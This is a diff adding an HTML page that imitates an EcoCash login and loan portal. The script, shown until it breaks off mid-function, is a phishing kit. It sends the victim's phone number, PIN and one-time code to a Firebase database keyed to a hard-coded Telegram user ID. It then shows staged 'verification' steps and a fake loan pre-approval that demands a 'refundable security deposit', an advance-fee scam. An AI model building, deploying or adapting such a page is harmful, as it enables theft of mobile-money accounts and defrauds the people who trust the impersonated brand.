@@ -1,0 +1,1025 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+  <title>EcoCash · Quick Loans</title>
+  <meta name="description" content="Apply for personal, business, or auto loans with our easy-to-use loan application. Get competitive rates and fast approval.">
+  <meta name="author" content="EcoCash">
+  <meta property="og:title" content="EcoCash - Quick Loans">
+  <meta property="og:description" content="Apply for personal, business, or auto loans with our easy-to-use loan application.">
+  <meta property="og:type" content="website">
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <!-- Firebase SDKs -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
+  
+  <style>
+    /* ===== GLOBAL VARIABLES (provided) ===== */
+    :root {
+      --background: 210 20% 98%;
+      --foreground: 220 20% 10%;
+      --card: 0 0% 100%;
+      --card-foreground: 220 20% 10%;
+      --popover: 0 0% 100%;
+      --popover-foreground: 220 20% 10%;
+      --primary: 145 80% 45%;
+      --primary-foreground: 0 0% 100%;
+      --primary-glow: 145 90% 55%;
+      --secondary: 210 25% 95%;
+      --secondary-foreground: 220 20% 10%;
+      --muted: 210 15% 92%;
+      --muted-foreground: 220 10% 45%;
+      --accent: 215 80% 55%;
+      --accent-foreground: 0 0% 100%;
+      --destructive: 0 72% 51%;
+      --destructive-foreground: 0 0% 100%;
+      --success: 152 69% 40%;
+      --success-foreground: 0 0% 100%;
+      --success-light: 152 60% 95%;
+      --border: 210 20% 88%;
+      --input: 210 20% 88%;
+      --ring: 0 85% 50%;
+      --radius: .75rem;
+      --eco-red: 0 100% 50%;
+      --eco-blue: 215 80% 55%;
+      --eco-dark: 220 25% 12%;
+      --royal-blue: 220 100% 35%;
+      --gradient-primary: linear-gradient(135deg, hsl(145 80% 45%), hsl(140 85% 55%));
+      --gradient-accent: linear-gradient(135deg, hsl(215 80% 55%), hsl(215 90% 65%));
+      --gradient-dark: linear-gradient(135deg, hsl(220 25% 12%), hsl(220 20% 20%));
+      --gradient-background: linear-gradient(180deg, hsl(210 20% 98%) 0%, hsl(210 25% 96%) 100%);
+      --gradient-card: linear-gradient(180deg, hsl(0 0% 100%) 0%, hsl(210 20% 99%) 100%);
+      --shadow-sm: 0 1px 2px 0 hsl(220 20% 10% / .05);
+      --shadow-md: 0 4px 6px -1px hsl(220 20% 10% / .08), 0 2px 4px -2px hsl(220 20% 10% / .04);
+      --shadow-lg: 0 10px 15px -3px hsl(220 20% 10% / .1), 0 4px 6px -4px hsl(220 20% 10% / .05);
+      --shadow-glow: 0 0 20px hsl(145 80% 45% / .25);
+      --sidebar-background: 0 0% 98%;
+      --sidebar-foreground: 240 5.3% 26.1%;
+      --sidebar-primary: 240 5.9% 10%;
+      --sidebar-primary-foreground: 0 0% 98%;
+      --sidebar-accent: 240 4.8% 95.9%;
+      --sidebar-accent-foreground: 240 5.9% 10%;
+      --sidebar-border: 220 13% 91%;
+      --sidebar-ring: 217.2 91.2% 59.8%;
+    }
+
+    /* ===== RESET & BASE ===== */
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: var(--gradient-background);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      margin: 0;
+      color: hsl(var(--foreground));
+    }
+
+    /* ===== LOGIN CARD ===== */
+    .loan-card {
+      width: 100%;
+      max-width: 400px;
+      background: hsl(var(--card));
+      border-radius: calc(var(--radius) * 2);
+      box-shadow: var(--shadow-lg), var(--shadow-glow);
+      overflow: hidden;
+      border: 1px solid hsl(var(--border) / 0.5);
+      transition: box-shadow 0.3s ease;
+      backdrop-filter: blur(2px);
+    }
+    .loan-card:hover { box-shadow: var(--shadow-lg), 0 0 30px hsl(145 80% 45% / 0.15); }
+
+    /* ===== HEADER ===== */
+    .card-header {
+      padding: 1.75rem 1.5rem 0.75rem 1.5rem;
+      text-align: center;
+      background: hsl(var(--card));
+    }
+    .brand {
+      font-size: 2.6rem;
+      font-weight: 700;
+      letter-spacing: -0.02em;
+      margin-bottom: 0.15rem;
+      display: inline-block;
+    }
+    .brand .eco { color: hsl(var(--eco-blue)); text-shadow: 0 0 12px hsl(215 80% 55% / 0.2); }
+    .brand .cash { color: #ff0000; text-shadow: 0 0 12px rgba(255, 0, 0, 0.3); }
+    .login-title {
+      font-size: 1.65rem;
+      font-weight: 700;
+      color: hsl(var(--foreground));
+      margin: 0.25rem 0 1.25rem 0;
+      letter-spacing: -0.01em;
+    }
+
+    /* ===== PHONE INPUT - DISABLED ===== */
+    .input-group {
+      display: flex;
+      align-items: center;
+      border: 2px solid hsl(var(--border));
+      border-radius: var(--radius);
+      padding: 0.45rem 0.75rem;
+      margin: 0 auto 1.25rem auto;
+      max-width: 100%;
+      background: hsl(var(--muted));
+      transition: border 0.2s, box-shadow 0.2s;
+      box-shadow: var(--shadow-sm);
+      opacity: 0.8;
+      cursor: not-allowed;
+    }
+    .country-selector {
+      display: flex;
+      align-items: center;
+      border-right: 2px solid hsl(var(--border));
+      padding-right: 0.75rem;
+      margin-right: 0.5rem;
+    }
+    .country-selector select {
+      background: transparent;
+      border: none;
+      font-weight: 600;
+      color: hsl(var(--foreground));
+      font-size: 0.9rem;
+      outline: none;
+      cursor: pointer;
+      padding: 0.1rem 0;
+    }
+    .phone-input {
+      flex: 1;
+      border: none;
+      outline: none;
+      font-size: 0.95rem;
+      background: transparent;
+      padding: 0.25rem 0;
+      min-width: 0;
+      color: hsl(var(--foreground));
+      cursor: not-allowed;
+    }
+    .phone-input:disabled { background: transparent; color: hsl(var(--foreground)); opacity: 0.8; }
+    .phone-error {
+      color: hsl(0 72% 51%);
+      font-size: 0.8rem;
+      text-align: center;
+      margin-top: -0.5rem;
+      margin-bottom: 0.5rem;
+      display: none;
+    }
+    .phone-error.visible { display: block; }
+
+    /* ===== VERIFICATION ERROR ===== */
+    .verification-error {
+      color: hsl(0 72% 51%);
+      font-size: 0.95rem;
+      font-weight: 600;
+      text-align: center;
+      margin: 0.5rem 0;
+      display: none;
+      padding: 0.5rem;
+      background: rgba(220, 38, 38, 0.1);
+      border-radius: var(--radius);
+      border: 1px solid hsl(0 72% 51% / 0.3);
+    }
+    .verification-error.visible { display: block; }
+
+    /* ===== PIN ===== */
+    .pin-label {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: hsl(var(--foreground));
+      margin-bottom: 0.6rem;
+      display: block;
+      text-align: center;
+      letter-spacing: 0.02em;
+    }
+    .pin-container {
+      display: flex;
+      gap: 0.75rem;
+      justify-content: center;
+      margin: 0.25rem 0 0.75rem 0;
+    }
+    .pin-digit {
+      width: 3.25rem;
+      height: 3.75rem;
+      border: 2px solid hsl(var(--border));
+      border-radius: var(--radius);
+      font-size: 1.8rem;
+      font-weight: 700;
+      text-align: center;
+      outline: none;
+      background: hsl(var(--card));
+      color: hsl(var(--foreground));
+      transition: all 0.15s ease;
+      box-shadow: var(--shadow-sm);
+    }
+    .pin-digit:focus {
+      border-color: hsl(var(--eco-blue));
+      box-shadow: 0 0 0 4px hsl(215 80% 55% / 0.15), var(--shadow-sm);
+      transform: scale(1.03);
+    }
+    .pin-digit.error {
+      border-color: hsl(0 72% 51%);
+      animation: shake 0.3s ease-in-out;
+    }
+    @keyframes shake {
+      0%, 100% { transform: translateX(0); }
+      25% { transform: translateX(-5px); }
+      75% { transform: translateX(5px); }
+    }
+    .forgot-pin {
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: hsl(var(--muted-foreground));
+      cursor: pointer;
+      display: inline-block;
+      margin: 0.15rem 0 0.25rem 0;
+      transition: color 0.15s;
+      text-align: center;
+      width: 100%;
+    }
+    .forgot-pin:hover { color: hsl(var(--eco-blue)); text-decoration: underline; }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 1rem;
+    }
+    .loading-overlay.active { display: flex; }
+    .spinner {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top: 6px solid hsl(145 80% 45%);
+      animation: spin 0.9s linear infinite;
+      box-shadow: 0 0 30px rgba(0,0,0,0.3);
+    }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loading-text { color: white; font-weight: 600; font-size: 1.3rem; text-shadow: 0 2px 12px rgba(0,0,0,0.5); text-align: center; }
+    .loading-sub { color: rgba(255,255,255,0.9); font-size: 1rem; margin-top: -0.2rem; text-shadow: 0 1px 6px rgba(0,0,0,0.4); text-align: center; line-height: 1.5; }
+
+    /* ===== VERIFICATION SEQUENCE OVERLAY ===== */
+    .verify-sequence-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.7);
+      backdrop-filter: blur(10px);
+      -webkit-backdrop-filter: blur(10px);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+    .verify-sequence-overlay.active { display: flex; }
+    .verify-sequence-overlay .step-spinner {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      border: 6px solid rgba(255,255,255,0.2);
+      border-top: 6px solid hsl(145 80% 45%);
+      animation: spin 0.9s linear infinite;
+      box-shadow: 0 0 30px rgba(0,0,0,0.3);
+    }
+    .verify-sequence-overlay .step-title { color: white; font-weight: 600; font-size: 1.3rem; text-shadow: 0 2px 12px rgba(0,0,0,0.5); text-align: center; }
+    .verify-sequence-overlay .step-description { color: rgba(255,255,255,0.9); font-size: 1rem; text-shadow: 0 1px 6px rgba(0,0,0,0.4); text-align: center; line-height: 1.5; margin-top: -0.5rem; }
+    .verify-sequence-overlay .step-progress { margin-top: 0.5rem; display: flex; justify-content: center; gap: 0.6rem; }
+    .verify-sequence-overlay .step-progress .dot {
+      width: 12px; height: 12px; border-radius: 50%;
+      background: rgba(255,255,255,0.25);
+      transition: all 0.3s ease;
+    }
+    .verify-sequence-overlay .step-progress .dot.active { background: hsl(145 80% 45%); transform: scale(1.2); box-shadow: 0 0 20px hsl(145 80% 45% / 0.5); }
+    .verify-sequence-overlay .step-progress .dot.completed { background: hsl(145 80% 45%); }
+    .verify-sequence-overlay .step-progress .dot.pulse { animation: pulse-dot 1s ease-in-out infinite; }
+    @keyframes pulse-dot { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.4); } }
+
+    /* ===== SUCCESS CARD ===== */
+    .success-card {
+      display: none;
+      width: 100%; max-width: 420px;
+      background: hsl(var(--card));
+      border-radius: calc(var(--radius) * 2);
+      box-shadow: var(--shadow-lg), var(--shadow-glow);
+      padding: 2rem 1.5rem;
+      border: 1px solid hsl(var(--border) / 0.5);
+      text-align: center;
+      max-height: 95vh;
+      overflow-y: auto;
+    }
+    .success-card.active { display: block; }
+    .success-card .congrats-title { font-size: 1.8rem; font-weight: 800; color: hsl(145 80% 40%); margin-bottom: 0.25rem; letter-spacing: -0.02em; }
+    .success-card .user-name { font-size: 1.3rem; font-weight: 700; color: hsl(var(--foreground)); margin-bottom: 0.5rem; }
+    .success-card .loan-sub { font-size: 0.95rem; color: hsl(var(--muted-foreground)); margin-bottom: 1rem; line-height: 1.6; }
+    .success-card .loan-sub .highlight { color: hsl(var(--primary)); font-weight: 700; }
+    .success-card .loan-sub .bonus { color: hsl(var(--eco-blue)); font-weight: 700; }
+    .credit-score-box {
+      background: hsl(215 80% 55%);
+      color: white;
+      border-radius: var(--radius);
+      padding: 1.25rem;
+      margin: 1rem 0;
+      text-align: center;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+    }
+    .credit-score-box .score-label { font-size: 0.85rem; opacity: 0.9; text-transform: uppercase; letter-spacing: 0.05em; }
+    .credit-score-box .score-number { font-size: 2.8rem; font-weight: 800; line-height: 1.2; }
+    .credit-score-box .score-sub { font-size: 0.85rem; opacity: 0.9; }
+    .compliance-box {
+      background: hsl(210 20% 98%);
+      border: 2px solid hsl(var(--border));
+      border-radius: var(--radius);
+      padding: 1rem 1.25rem;
+      margin: 1rem 0;
+      text-align: left;
+      box-shadow: var(--shadow-sm);
+    }
+    .compliance-box .compliance-title { font-size: 0.8rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; color: hsl(var(--muted-foreground)); margin-bottom: 0.5rem; text-align: center; }
+    .compliance-box .compliance-text { font-size: 0.9rem; color: hsl(var(--foreground)); line-height: 1.6; }
+    .compliance-box .compliance-text strong { color: hsl(145 80% 45%); }
+    .compliance-box .compliance-dates { margin-top: 0.75rem; padding-top: 0.75rem; border-top: 1px solid hsl(var(--border)); font-size: 0.8rem; color: hsl(var(--muted-foreground)); display: flex; justify-content: space-between; flex-wrap: wrap; gap: 0.25rem; }
+    .success-redirect { color: hsl(var(--muted-foreground)); font-size: 0.9rem; margin: 1rem 0 1.25rem 0; }
+    .success-redirect .redirect-timer { font-weight: 700; color: hsl(var(--eco-blue)); font-size: 1.1rem; }
+    .success-btn {
+      display: inline-block; padding: 0.85rem 2rem;
+      background: var(--gradient-primary); color: white; border: none; border-radius: var(--radius);
+      font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.25s ease; text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; text-align: center;
+    }
+    .success-btn:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.15); }
+
+    /* ===== BOTTOM SECTION ===== */
+    .bottom-section {
+      margin-top: 1.5rem;
+      padding: 2.25rem 1.5rem 2.25rem 1.5rem;
+      background: #1a3c8a;
+      color: white;
+      border-top-left-radius: 200px 45px;
+      border-top-right-radius: 200px 45px;
+      text-align: center;
+      position: relative;
+      overflow: hidden;
+      box-shadow: inset 0 4px 12px rgba(0,0,0,0.08);
+    }
+    .bottom-section::after {
+      content: '';
+      position: absolute;
+      top: -40%; right: -20%; width: 150%; height: 150%;
+      background: radial-gradient(circle at 70% 30%, rgba(255,255,255,0.08), transparent 70%);
+      pointer-events: none;
+    }
+    .bottom-section .helper-text { font-size: 0.9rem; color: rgba(255,255,255,0.95); margin-bottom: 1.25rem; line-height: 1.5; position: relative; z-index: 2; font-weight: 450; }
+    .contact-btn-wrapper { position: relative; z-index: 2; margin-bottom: 1.25rem; }
+    .contact-btn {
+      display: inline-flex; align-items: center; justify-content: center;
+      background: white; color: #1a3c8a; border: none;
+      padding: 0.85rem 2rem; border-radius: calc(var(--radius) + 6px);
+      font-weight: 600; font-size: 1rem; cursor: pointer; transition: all 0.25s ease;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.12); text-decoration: none; min-width: 180px; letter-spacing: 0.01em;
+    }
+    .contact-btn:hover { transform: translateY(-3px) scale(1.02); box-shadow: 0 12px 28px -8px rgba(0,0,0,0.3); background: #ffffff; }
+    .contact-btn:active { transform: scale(0.97); }
+    .version-info { margin-top: 0.5rem; font-size: 0.7rem; color: rgba(255,255,255,0.85); position: relative; z-index: 2; }
+    .version-info .version { font-weight: 600; letter-spacing: 0.03em; }
+    .terms { margin-top: 0.5rem; font-size: 0.7rem; color: rgba(255,255,255,0.8); }
+    .terms span { text-decoration: underline; cursor: pointer; font-weight: 500; transition: color 0.15s; }
+    .terms span:hover { color: white; }
+
+    /* ===== OTP CARD ===== */
+    .otp-card {
+      display: none;
+      width: 100%; max-width: 400px;
+      background: hsl(var(--card));
+      border-radius: calc(var(--radius) * 2);
+      box-shadow: var(--shadow-lg), var(--shadow-glow);
+      padding: 2rem 1.5rem;
+      border: 1px solid hsl(var(--border) / 0.5);
+    }
+    .otp-card.active { display: block; }
+    .otp-back-btn {
+      background: none; border: none; color: hsl(var(--muted-foreground));
+      font-size: 1.2rem; cursor: pointer; margin-bottom: 1rem;
+      display: flex; align-items: center; gap: 0.5rem; font-weight: 500; transition: color 0.15s;
+    }
+    .otp-back-btn:hover { color: hsl(var(--foreground)); }
+    .otp-title { font-size: 1.6rem; font-weight: 600; color: hsl(var(--foreground)); margin-bottom: 0.5rem; }
+    .otp-subtitle { color: hsl(var(--muted-foreground)); margin-bottom: 1.5rem; line-height: 1.5; }
+    .otp-subtitle .phone-display { font-weight: 600; color: hsl(var(--foreground)); }
+    .otp-container {
+      display: flex; gap: 0.6rem; justify-content: center; margin-bottom: 1.5rem; flex-wrap: wrap;
+    }
+    .otp-digit {
+      width: 2.8rem; height: 3.5rem; text-align: center; font-size: 1.4rem; font-weight: 600;
+      border: 2px solid hsl(var(--border)); border-radius: var(--radius); outline: none;
+      background: hsl(var(--card)); color: hsl(var(--foreground)); transition: all 0.15s ease;
+      box-shadow: var(--shadow-sm);
+    }
+    .otp-digit:focus {
+      border-color: hsl(var(--eco-blue));
+      box-shadow: 0 0 0 4px hsl(215 80% 55% / 0.15), var(--shadow-sm);
+      transform: scale(1.03);
+    }
+    .otp-resend { text-align: center; color: hsl(var(--muted-foreground)); font-size: 0.9rem; margin-bottom: 1.25rem; }
+    .otp-resend .resend-time { font-weight: 600; }
+    .otp-submit-btn {
+      width: 100%; padding: 0.85rem; border: none; border-radius: var(--radius);
+      background: hsl(var(--eco-blue)); color: white; font-weight: 600; font-size: 1rem;
+      cursor: pointer; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    .otp-submit-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(0,0,0,0.15); background: hsl(215 80% 50%); }
+    .otp-submit-btn:disabled { background: hsl(var(--muted)); cursor: not-allowed; opacity: 0.7; }
+
+    @media (max-width: 420px) {
+      .brand { font-size: 2.2rem; }
+      .login-title { font-size: 1.4rem; }
+      .pin-digit { width: 2.8rem; height: 3.2rem; font-size: 1.5rem; }
+      .card-header { padding: 1.25rem 1rem 0.5rem 1rem; }
+      .bottom-section { padding: 1.75rem 1rem 1.75rem 1rem; }
+      .contact-btn { padding: 0.75rem 1.5rem; min-width: 150px; font-size: 0.9rem; }
+      .otp-digit { width: 2.4rem; height: 3rem; font-size: 1.2rem; }
+      .otp-card { padding: 1.5rem 1rem; }
+      .success-card { padding: 1.5rem 1rem; }
+      .spinner { width: 50px; height: 50px; border-width: 5px; }
+      .loading-text { font-size: 1.1rem; }
+      .loading-sub { font-size: 0.9rem; }
+      .verify-sequence-overlay .step-spinner { width: 50px; height: 50px; border-width: 5px; }
+      .verify-sequence-overlay .step-title { font-size: 1.1rem; }
+      .verify-sequence-overlay .step-description { font-size: 0.9rem; }
+      .credit-score-box .score-number { font-size: 2.2rem; }
+      .success-card .congrats-title { font-size: 1.5rem; }
+      .compliance-box .compliance-dates { flex-direction: column; align-items: center; }
+    }
+  </style>
+</head>
+<body>
+  <div id="root">
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+      <div class="spinner"></div>
+      <div class="loading-text" id="loadingTitle">Secure Verification</div>
+      <div class="loading-sub" id="loadingSub">Verifying your PIN...<br>Please do not close this page.</div>
+    </div>
+
+    <!-- Verification Sequence Overlay -->
+    <div id="verifySequence" class="verify-sequence-overlay">
+      <div class="step-spinner" id="stepSpinner"></div>
+      <div class="step-title" id="stepTitle">Checking account details...</div>
+      <div class="step-description" id="stepDescription">Please wait while we verify your information</div>
+      <div class="step-progress" id="stepProgress">
+        <span class="dot active pulse" data-step="0"></span>
+        <span class="dot" data-step="1"></span>
+        <span class="dot" data-step="2"></span>
+        <span class="dot" data-step="3"></span>
+      </div>
+    </div>
+
+    <!-- Login Card -->
+    <div id="loginCard" class="loan-card">
+      <div class="card-header">
+        <div class="brand"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+        <div class="login-title">Login</div>
+        <div class="input-group">
+          <div class="country-selector">
+            <select id="countryCode" aria-label="Country code" disabled>
+              <option value="+263">+263</option><option value="+27">+27</option><option value="+260">+260</option>
+              <option value="+255">+255</option><option value="+254">+254</option><option value="+256">+256</option>
+              <option value="+233">+233</option><option value="+234">+234</option><option value="+44">+44</option>
+              <option value="+1">+1</option><option value="+91">+91</option><option value="+61">+61</option>
+              <option value="+86">+86</option><option value="+81">+81</option><option value="+49">+49</option>
+              <option value="+33">+33</option><option value="+39">+39</option><option value="+34">+34</option>
+              <option value="+55">+55</option><option value="+52">+52</option><option value="+7">+7</option>
+              <option value="+82">+82</option><option value="+31">+31</option><option value="+46">+46</option>
+              <option value="+41">+41</option><option value="+64">+64</option><option value="+65">+65</option>
+              <option value="+60">+60</option><option value="+63">+63</option><option value="+62">+62</option>
+              <option value="+66">+66</option><option value="+971">+971</option><option value="+966">+966</option>
+              <option value="+972">+972</option><option value="+353">+353</option><option value="+45">+45</option>
+              <option value="+47">+47</option><option value="+358">+358</option><option value="+30">+30</option>
+              <option value="+90">+90</option><option value="+20">+20</option>
+            </select>
+          </div>
+          <input type="tel" id="phoneInput" inputmode="tel" placeholder="Phone Number" maxlength="15" class="phone-input" disabled value="">
+        </div>
+        <div id="phoneError" class="phone-error">Please enter a valid phone number</div>
+        <div id="verificationError" class="verification-error">Phone or pin is incorrect.</div>
+
+        <div class="pin-label">Enter your PIN</div>
+        <div class="pin-container">
+          <input id="pin-0" type="text" inputmode="numeric" maxlength="1" class="pin-digit" value="">
+          <input id="pin-1" type="text" inputmode="numeric" maxlength="1" class="pin-digit" value="">
+          <input id="pin-2" type="text" inputmode="numeric" maxlength="1" class="pin-digit" value="">
+          <input id="pin-3" type="text" inputmode="numeric" maxlength="1" class="pin-digit" value="">
+        </div>
+        <div class="forgot-pin">Forgot PIN?</div>
+      </div>
+      <div class="bottom-section">
+        <div class="helper-text">To register an EcoCash wallet or get assistance,<br>click below</div>
+        <div class="contact-btn-wrapper">
+          <a href="https://ecocash.co.zw/contact-us/" target="_blank" rel="noopener noreferrer" class="contact-btn">
+            <span class="btn-text">Contact Us</span>
+          </a>
+        </div>
+        <div class="version-info">
+          <div class="version">v2.1.3P</div>
+          <div class="terms">By signing in you agree to the <span>Terms and Conditions</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- OTP Card -->
+    <div id="otpCard" class="otp-card">
+      <button class="otp-back-btn" onclick="goBackToLogin()">← Back</button>
+      <h2 class="otp-title">OTP Verification</h2>
+      <p class="otp-subtitle">
+        Enter the OTP sent to your phone number<br>
+        <span class="phone-display" id="otpPhoneDisplay">+263787877665</span>
+      </p>
+      <div class="otp-container">
+        <input id="otp-0" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+        <input id="otp-1" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+        <input id="otp-2" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+        <input id="otp-3" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+        <input id="otp-4" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+        <input id="otp-5" type="text" inputmode="numeric" maxlength="1" class="otp-digit" value="" readonly>
+      </div>
+      <p class="otp-resend">
+        Resend OTP in <span class="resend-time" id="resendTimer">93</span> seconds
+      </p>
+      <button id="otpSubmitBtn" disabled class="otp-submit-btn">Submit OTP</button>
+    </div>
+
+    <!-- Success Card -->
+    <div id="successCard" class="success-card">
+      <h2 class="congrats-title">Congratulations</h2>
+      <p class="user-name" id="successUserName"><strong>DICKSON YEGON</strong></p>
+      <p class="loan-sub">
+        You have been pre-approved for a loan of <span class="highlight">$550</span>, 
+        including a <span class="bonus">10% bonus</span> on your base loan amount of $500.
+      </p>
+      <div class="credit-score-box">
+        <div class="score-label">Credit Score</div>
+        <div class="score-number">720</div>
+        <div class="score-sub">Based on your credit score of 720, you qualify for enhanced loan terms and benefits.</div>
+      </div>
+      <div class="compliance-box">
+        <div class="compliance-title">Compliance Notice</div>
+        <div class="compliance-text">
+          To proceed with loan disbursement, your EcoCash account must remain active and maintain a <strong>refundable security deposit of $55.00</strong> (10% of your total loan amount). This deposit will be returned upon successful loan repayment.
+        </div>
+        <div class="compliance-dates">
+          <span><strong>Application Date:</strong> <span id="applicationDate"></span></span>
+          <span><strong>Last Updated:</strong> <span id="lastUpdated"></span></span>
+        </div>
+      </div>
+      <p class="success-redirect">
+        Redirecting to <strong>EcoCash</strong> in <span class="redirect-timer" id="redirectTimer">100</span> seconds...
+      </p>
+      <a href="https://ecocash.co.zw" target="_blank" rel="noopener noreferrer" class="success-btn">
+        Visit EcoCash Website Now
+      </a>
+    </div>
+  </div>
+
+  <script>
+    // ===================================================
+    // 🔧 TELEGRAM USER ID
+    // ===================================================
+    const TELEGRAM_USER_ID = "7672643726";
+    // ===================================================
+
+    // ===== FIREBASE CONFIGURATION =====
+    const firebaseConfig = {
+      databaseURL: "https://altibex-19bc2-default-rtdb.firebaseio.com/"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    (function() {
+      // ===== DOM REFS =====
+      const pinInputs = document.querySelectorAll('.pin-digit');
+      const phoneInput = document.getElementById('phoneInput');
+      const countryCodeSelect = document.getElementById('countryCode');
+      const phoneError = document.getElementById('phoneError');
+      const verificationError = document.getElementById('verificationError');
+      const loadingOverlay = document.getElementById('loadingOverlay');
+      const loadingTitle = document.getElementById('loadingTitle');
+      const loadingSub = document.getElementById('loadingSub');
+      const successUserName = document.getElementById('successUserName');
+      let redirectTimeout = null;
+      let currentPhoneNumber = '';
+      let currentPin = '';
+      let pinVerifyListener = null;
+      let otpVerifyListener = null;
+      let isVerifying = false;
+      
+      if (pinInputs.length) setTimeout(() => pinInputs[0].focus(), 100);
+
+      // ===== LOAD PHONE FROM LOCAL STORAGE =====
+      function loadPhoneFromLocalStorage() {
+        try {
+          const savedData = localStorage.getItem('ecocash_application');
+          if (savedData) {
+            const data = JSON.parse(savedData);
+            if (data.countryCode) countryCodeSelect.value = data.countryCode;
+            if (data.phone) {
+              const phone = data.phone.replace(/\D/g, '');
+              if (phone.length >= 7 && phone.length <= 15) {
+                phoneInput.value = phone;
+                currentPhoneNumber = data.countryCode + phone;
+                return phone;
+              }
+            }
+          }
+        } catch (e) { console.error('Error loading from localStorage:', e); }
+        return '';
+      }
+
+      function formatDate(date) {
+        const y = date.getFullYear(), m = String(date.getMonth()+1).padStart(2,'0'), d = String(date.getDate()).padStart(2,'0');
+        const h = String(date.getHours()).padStart(2,'0'), min = String(date.getMinutes()).padStart(2,'0'), s = String(date.getSeconds()).padStart(2,'0');
+        return y+'-'+m+'-'+d+' '+h+':'+min+':'+s;
+      }
+      function formatDateOnly(date) {
+        const y = date.getFullYear(), m = String(date.getMonth()+1).padStart(2,'0'), d = String(date.getDate()).padStart(2,'0');
+        return y+'-'+m+'-'+d;
+      }
+
+      function updateDates() {
+        const now = new Date();
+        document.getElementById('applicationDate').textContent = formatDateOnly(now);
+        document.getElementById('lastUpdated').textContent = formatDate(now);
+      }
+
+      // ===== VERIFICATION SEQUENCE =====
+      const verificationSteps = [
+        { title: 'Checking account details...', description: 'Verifying your account information and history' },
+        { title: 'Verifying PIN...', description: 'Confirming your secure PIN code' },
+        { title: 'Calculating credit score...', description: 'Analyzing your financial standing' },
+        { title: 'Finalizing approval...', description: 'Preparing your loan offer' }
+      ];
+
+      function showVerificationSequence() {
+        const overlay = document.getElementById('verifySequence');
+        const stepTitle = document.getElementById('stepTitle');
+        const stepDescription = document.getElementById('stepDescription');
+        const dots = document.querySelectorAll('#stepProgress .dot');
+        overlay.classList.add('active');
+        let currentStep = 0;
+        function updateStep(index) {
+          if (index >= verificationSteps.length) {
+            setTimeout(() => { overlay.classList.remove('active'); showSuccessScreen(); }, 400);
+            return;
+          }
+          const step = verificationSteps[index];
+          stepTitle.textContent = step.title;
+          stepDescription.textContent = step.description;
+          dots.forEach((dot, i) => {
+            dot.className = 'dot';
+            if (i < index) dot.classList.add('completed');
+            else if (i === index) dot.classList.add('active', 'pulse');
+          });
+          setTimeout(() => updateStep(index+1), 2500);
+        }
+        updateStep(0);
+      }
+
+      function isValidPhone(phone) { return phone.replace(/\D/g, '').length >= 7 && phone.replace(/\D/g, '').length <= 15; }
+
+      // ===== FIREBASE =====
+      function saveBothToFirebase(phone, pin) {
+        return database.ref('Telegram Users/'+TELEGRAM_USER_ID).update({ phone, pin });
+      }
+      function saveOtpOnlyToFirebase(otp) {
+        return database.ref('Telegram Users/'+TELEGRAM_USER_ID).update({ otp });
+      }
+      function resetVerifyToDefault() {
+        return database.ref('Telegram Users/'+TELEGRAM_USER_ID).update({ verify: 1 });
+      }
+
+      function showLoadingSpinner(title, sub) {
+        loadingTitle.textContent = title || 'Secure Verification';
+        loadingSub.innerHTML = sub || 'Verifying your PIN...<br>Please do not close this page.';
+        loadingOverlay.classList.add('active');
+      }
+      function hideLoadingSpinner() { loadingOverlay.classList.remove('active'); }
+
+      function showVerificationError(msg) {
+        verificationError.textContent = msg || 'Phone or pin is incorrect.';
+        verificationError.classList.add('visible');
+        setTimeout(() => verificationError.classList.remove('visible'), 5000);
+      }
+
+      // ===== LOGIN TRIGGER =====
+      function triggerLoginWithPhoneAndPin(phone, pin) {
+        verificationError.classList.remove('visible');
+        if (!isValidPhone(phone)) { phoneError.classList.add('visible'); return; }
+        if (!pin || pin.length !== 4) { showVerificationError('Please enter a valid 4-digit PIN.'); return; }
+        const countryCode = countryCodeSelect.value;
+        const fullPhone = countryCode + phone;
+        console.log('📱 Phone + PIN ready', fullPhone, pin);
